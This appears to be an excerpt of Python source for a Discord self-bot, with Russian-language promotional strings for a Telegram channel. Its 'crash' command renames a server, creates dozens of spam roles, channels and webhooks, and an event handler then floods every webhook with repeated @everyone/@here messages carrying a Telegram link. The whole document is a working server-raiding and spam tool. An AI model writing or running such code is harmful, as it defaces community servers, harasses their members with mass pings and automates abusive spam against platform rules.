...
async def on_ready():
    ...
    await client.change_presence(activity = discord.Streaming(name="Селф боты - @discord_self_bot (tg)", url="https://www.twitch.tv/asap_ok"))
...
@client.command()
async def crash(ctx):
    await ctx.guild.edit(name='Crashed by @discord_self_bot')
    ...
    for i in range(50):
        await ctx.guild.create_role(name='Crash By @discord_self_bot')
        ch = await ctx.guild.create_text_channel('crash-by-discord_self_bot')
       # await ch.send(f'Серв крашиться одним из ботов @discord-self-bot (телеграмм)\n@everyone\nhttps://t.me/discord_self_bot')
        await ch.create_webhook(name='@discord_self_bot')
...
async def on_guild_channel_create(channel):
    if channel.name == 'crash-by-discord-self-bot':
        for i in range(100):
            ...
            for hook in hooks:
                await hook.send('Серв крашиться одним из ботов @discord_self_bot\n||@everyone  @here||\nhttps://t.me/discord_self_bot')
